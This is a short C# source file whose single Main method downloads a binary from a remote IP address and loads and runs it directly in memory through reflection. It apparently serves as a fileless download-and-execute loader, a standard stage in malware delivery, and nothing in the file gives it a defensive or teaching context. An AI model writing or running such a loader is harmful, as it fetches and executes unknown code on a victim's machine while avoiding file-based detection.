using System;
using System.Net;
using System.Reflection;
class L { static void Main() { var b = new WebClient().DownloadData("http://203.0.113.20/p.bin"); Assembly.Load(b).EntryPoint.Invoke(null, null); } }
